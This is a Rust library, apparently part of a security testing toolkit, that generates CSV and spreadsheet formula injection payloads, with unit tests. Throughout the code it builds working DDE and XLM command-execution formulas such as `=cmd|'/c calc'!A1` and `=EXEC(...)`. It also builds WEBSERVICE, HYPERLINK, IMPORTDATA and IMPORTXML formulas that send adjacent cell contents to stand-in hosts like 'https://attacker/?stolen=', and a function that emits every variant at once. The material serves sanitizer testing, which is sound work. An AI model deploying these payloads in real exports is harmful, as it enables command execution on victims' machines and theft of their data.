//! CSV / spreadsheet formula injection library (CWE-1236).
//!
//! When a web application exports user-controlled data as CSV/XLSX
//! and a victim opens the file in Excel / LibreOffice Calc / Google
//! Sheets / Numbers, every cell that begins with `=`, `+`, `-`, `@`,
//! TAB, or CR is treated as a FORMULA, not as data.
//!
//! The attack:
//!
//! 1. Attacker submits a username / comment / address line that
//!    starts with one of the trigger chars.
//! 2. Admin exports a report containing that field as `report.csv`.
//! 3. Admin opens it in Excel → formula executes inside Excel's
//!    process. Excel offers RCE primitives (`=cmd|'/c calc'!A1`,
//!    `=HYPERLINK(...)`, modern: `=WEBSERVICE("https://attacker/")`).
//!
//! Most WAFs and most application sanitizers don't scan for this —
//! the input passes XSS / SQL filters because it doesn't look like a
//! web attack. The bug fires inside the victim spreadsheet program.
//!
//! Coverage:
//!
//! - **Equals-prefix** (`=`): every Excel formula.
//! - **Plus / minus / @ prefix**: alternate Excel formula starts.
//! - **TAB / CR prefix**: spreadsheet programs strip-then-evaluate.
//! - **DDE injection**: `=cmd|...!A1` for Excel (still works ~2024
//!   when DDE is enabled in Trust Center).
//! - **`HYPERLINK` phishing**: `=HYPERLINK("https://attacker/?stolen="&A1,"Click me")`
//!   — attacker URL plus a query exfiltrating the adjacent cell.
//! - **`WEBSERVICE` exfiltration**: `=WEBSERVICE("https://attacker/?d="&A1)`.
//!   Excel 2013+ fetches the URL.
//! - **`IMPORTDATA` / `IMPORTXML` exfil** (Google Sheets).
//! - **R1C1 reference**: `=R[1]C[1]` — escapes A1-only filters.
//! - **MacroSheet / XLM macros**: old Excel macro language.
//! - **Cell formatting**: `'<` quoted-prefix to inject HTML when
//!   the sheet is re-rendered as web view.
//! - **CSV row injection**: trailing CRLF breaks the row boundary.
//!
//! Every output is intentionally MINIMAL — operator picks the
//! injection point. The library does NOT add quotes or escape — the
//! exporter's sanitizer (if any) is the surface under test.

/// Build an `=cmd|'...'` DDE-injection payload. Triggers Excel's
/// Dynamic Data Exchange — when the spreadsheet opens, Excel pops
/// "external data" warning; user clicks Allow; attacker command runs.
///
/// `command` is the shell command to execute (Windows-host).
#[must_use]
pub fn excel_dde(command: &str) -> String {
    // The canonical exploit: `=cmd|'/c calc'!A1`. The `	` (tab)
    // variant works after Excel's 2018 DDE patch.
    format!("=cmd|'/c {command}'!A1")
}

/// Build an `=HYPERLINK` phishing payload. When clicked, navigates
/// to attacker URL. By exfiltrating adjacent cell (`A1`) in the URL
/// the operator captures whatever sensitive data sits next to the
/// poisoned cell.
#[must_use]
pub fn hyperlink_phish(attacker_url: &str, link_text: &str) -> String {
    format!("=HYPERLINK(\"{attacker_url}?stolen=\"&A1,\"{link_text}\")")
}

/// Build a `=WEBSERVICE` SSRF + exfil. Excel 2013+ silently fetches
/// the URL ON FILE OPEN (no click), GETs the response, places result
/// in cell. With a query parameter pulling in an adjacent cell,
/// the attacker captures it.
#[must_use]
pub fn webservice_exfil(attacker_url: &str) -> String {
    format!("=WEBSERVICE(\"{attacker_url}?stolen=\"&A1)")
}

/// Build a Google Sheets `=IMPORTDATA` exfil. Google Sheets fetches
/// the URL when the cell renders.
#[must_use]
pub fn importdata_exfil(attacker_url: &str) -> String {
    format!("=IMPORTDATA(\"{attacker_url}?stolen=\"&A1)")
}

/// Build a Google Sheets `=IMPORTXML` exfil — fetches+parses XML,
/// useful when CSP blocks `=IMPORTDATA`.
#[must_use]
pub fn importxml_exfil(attacker_url: &str, xpath: &str) -> String {
    format!("=IMPORTXML(\"{attacker_url}?stolen=\"&A1,\"{xpath}\")")
}

/// Build a simple `=2+5` formula. Tests whether sanitization fires
/// on ANY formula, not just dangerous ones.
#[must_use]
pub fn benign_formula() -> &'static str {
    "=2+5"
}

/// Build the `+`-prefix formula variant — Excel treats this as a
/// formula (legacy Lotus 1-2-3 compat).
#[must_use]
pub fn plus_prefix(content: &str) -> String {
    format!("+{content}")
}

/// Build the `-`-prefix variant.
#[must_use]
pub fn minus_prefix(content: &str) -> String {
    format!("-{content}")
}

/// Build the `@`-prefix variant — Lotus 1-2-3 only, but Excel
/// imports them.
#[must_use]
pub fn at_prefix(content: &str) -> String {
    format!("@{content}")
}

/// Build the TAB-prefix variant — Excel strips leading TAB then
/// evaluates. CSV sanitizers that strip-then-check may miss this.
#[must_use]
pub fn tab_prefix(content: &str) -> String {
    format!("\t{content}")
}

/// Build the CR-prefix variant (carriage return without newline) —
/// some CSV parsers split-on-CRLF but Excel evaluates after the CR.
#[must_use]
pub fn cr_prefix(content: &str) -> String {
    format!("\r{content}")
}

/// Build the `0x0A`-prefix variant — LF-only line endings.
#[must_use]
pub fn lf_prefix(content: &str) -> String {
    format!("\n{content}")
}

/// Build a row-injection payload that breaks out of the current CSV
/// row. After the legitimate cell value, the attacker inserts CRLF
/// + an entirely new row whose first cell is a formula.
#[must_use]
pub fn row_inject(legit_value: &str, injected_formula: &str) -> String {
    format!("{legit_value}\r\n{injected_formula}")
}

/// Build a quoted-prefix payload — RFC 4180 §2.7 says values in
/// double quotes preserve everything including CRLF. Some
/// sanitizers strip the wrapping quotes; some don't. Excel renders
/// `"=2+5"` as the LITERAL string "=2+5"; LibreOffice CALC evaluates.
#[must_use]
pub fn quoted_formula(formula_body: &str) -> String {
    format!("\"={formula_body}\"")
}

/// Build a `=R1C1`-reference formula — escapes A1-only filters. Some
/// sanitizers blocklist A1/A2/B1 patterns but miss R1C1.
#[must_use]
pub fn r1c1_reference() -> &'static str {
    "=R[1]C[1]"
}

/// Build an XLM (old Excel 4 macro) payload. Some legacy
/// xlsx files still contain XLM sheets — `=EXEC("calc.exe")`.
#[must_use]
pub fn xlm_macro(command: &str) -> String {
    format!("=EXEC(\"{command}\")")
}

/// One-shot fan-out: every formula injection variant for a given
/// attacker URL / command. Returns ~15 payloads.
#[must_use]
pub fn all_csv_attacks(attacker_url: &str, command: &str) -> Vec<(&'static str, String)> {
    vec![
        ("dde-cmd", excel_dde(command)),
        ("hyperlink", hyperlink_phish(attacker_url, "Click")),
        ("webservice", webservice_exfil(attacker_url)),
        ("importdata", importdata_exfil(attacker_url)),
        ("importxml", importxml_exfil(attacker_url, "//body")),
        ("plus-prefix", plus_prefix(&hyperlink_phish(attacker_url, "x")[1..])),
        ("minus-prefix", minus_prefix(&hyperlink_phish(attacker_url, "x")[1..])),
        ("at-prefix", at_prefix(&hyperlink_phish(attacker_url, "x")[1..])),
        ("tab-prefix", tab_prefix(&excel_dde(command))),
        ("cr-prefix", cr_prefix(&excel_dde(command))),
        ("lf-prefix", lf_prefix(&excel_dde(command))),
        ("row-inject", row_inject("safe", &excel_dde(command))),
        ("quoted", quoted_formula(&format!("WEBSERVICE(\"{attacker_url}\")"))),
        ("r1c1", r1c1_reference().to_string()),
        ("xlm-exec", xlm_macro(command)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn excel_dde_format() {
        let p = excel_dde("calc");
        assert_eq!(p, "=cmd|'/c calc'!A1");
    }

    #[test]
    fn excel_dde_starts_with_equals() {
        let p = excel_dde("whoami");
        assert!(p.starts_with('='));
    }

    #[test]
    fn hyperlink_phish_includes_url_and_exfil_cell() {
        let p = hyperlink_phish("https://attacker", "Click");
        assert!(p.contains("HYPERLINK("));
        assert!(p.contains("https://attacker"));
        assert!(p.contains("&A1"));
        assert!(p.contains("Click"));
    }

    #[test]
    fn webservice_exfil_basic() {
        let p = webservice_exfil("https://attacker");
        assert!(p.contains("WEBSERVICE("));
        assert!(p.contains("&A1"));
    }

    #[test]
    fn importdata_exfil_basic() {
        let p = importdata_exfil("https://attacker");
        assert!(p.contains("IMPORTDATA("));
    }

    #[test]
    fn importxml_exfil_takes_xpath() {
        let p = importxml_exfil("https://attacker", "//body");
        assert!(p.contains("IMPORTXML("));
        assert!(p.contains("//body"));
    }

    #[test]
    fn benign_formula_simple() {
        assert_eq!(benign_formula(), "=2+5");
    }

    #[test]
    fn plus_prefix_starts_with_plus() {
        let p = plus_prefix("HYPERLINK(...)");
        assert!(p.starts_with('+'));
        assert!(!p.starts_with('='));
    }

    #[test]
    fn minus_prefix_starts_with_minus() {
        let p = minus_prefix("body");
        assert!(p.starts_with('-'));
    }

    #[test]
    fn at_prefix_starts_with_at() {
        let p = at_prefix("body");
        assert!(p.starts_with('@'));
    }

    #[test]
    fn tab_prefix_starts_with_tab() {
        let p = tab_prefix("=cmd");
        assert!(p.starts_with('\t'));
    }

    #[test]
    fn cr_prefix_starts_with_cr() {
        let p = cr_prefix("=cmd");
        assert!(p.starts_with('\r'));
        assert!(!p.starts_with("\r\n"));
    }

    #[test]
    fn lf_prefix_starts_with_lf() {
        let p = lf_prefix("=cmd");
        assert!(p.starts_with('\n'));
        assert!(!p.starts_with("\r\n"));
    }

    #[test]
    fn row_inject_contains_crlf() {
        let p = row_inject("legit", "=evil");
        assert!(p.contains("\r\n"));
        assert!(p.contains("legit"));
        assert!(p.contains("=evil"));
    }

    #[test]
    fn quoted_formula_has_quotes() {
        let p = quoted_formula("2+5");
        assert!(p.starts_with('"'));
        assert!(p.ends_with('"'));
        assert!(p.contains("=2+5"));
    }

    #[test]
    fn r1c1_reference_format() {
        assert_eq!(r1c1_reference(), "=R[1]C[1]");
    }

    #[test]
    fn xlm_macro_format() {
        let p = xlm_macro("calc.exe");
        assert!(p.contains("EXEC("));
        assert!(p.contains("calc.exe"));
    }

    #[test]
    fn all_csv_attacks_minimum_count() {
        let v = all_csv_attacks("https://attacker", "calc");
        assert!(v.len() >= 14, "got {}", v.len());
    }

    #[test]
    fn all_csv_attacks_unique_names() {
        let v = all_csv_attacks("a", "b");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_csv_each_payload_nonempty() {
        let v = all_csv_attacks("a", "b");
        for (_, p) in &v {
            assert!(!p.is_empty());
        }
    }

    #[test]
    fn every_trigger_char_appears_somewhere() {
        // Make sure the trigger chars `=`, `+`, `-`, `@`, '\t', '\r',
        // '\n' all have a variant in the fan-out.
        let v = all_csv_attacks("a", "b");
        let all_first_chars: std::collections::HashSet<char> = v
            .iter()
            .filter_map(|(_, p)| p.chars().next())
            .collect();
        for required in ['=', '+', '-', '@', '\t', '\r', '\n'] {
            assert!(
                all_first_chars.contains(&required),
                "fan-out missing trigger char {:?}",
                required
            );
        }
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_csv_attacks("u", "c");
        let b = all_csv_attacks("u", "c");
        assert_eq!(a, b);
    }

    #[test]
    fn excel_dde_handles_quote_in_command() {
        // Operator passes shell args verbatim. Quotes inside should
        // pass through (Excel handles them in the DDE syntax).
        let p = excel_dde("\"echo test\"");
        assert!(p.contains("\"echo test\""));
    }

    #[test]
    fn hyperlink_phish_link_text_preserved() {
        let p = hyperlink_phish("u", "Important: Read me!");
        assert!(p.contains("Important: Read me!"));
    }

    #[test]
    fn adversarial_long_url_no_panic() {
        let big = "x".repeat(10_000);
        let _ = webservice_exfil(&big);
        let _ = hyperlink_phish(&big, &big);
        let _ = importdata_exfil(&big);
    }

    #[test]
    fn adversarial_unicode_in_command() {
        let p = excel_dde("éñ中文");
        assert!(p.contains("éñ中文"));
    }

    #[test]
    fn quoted_formula_escapes_inner_quotes_minimally() {
        // We don't auto-escape inner quotes — operator is responsible
        // for CSV quoting at the export layer. The test just checks
        // that we don't panic on inner quotes.
        let p = quoted_formula("HYPERLINK(\"u\",\"t\")");
        assert!(p.contains("HYPERLINK"));
    }
}
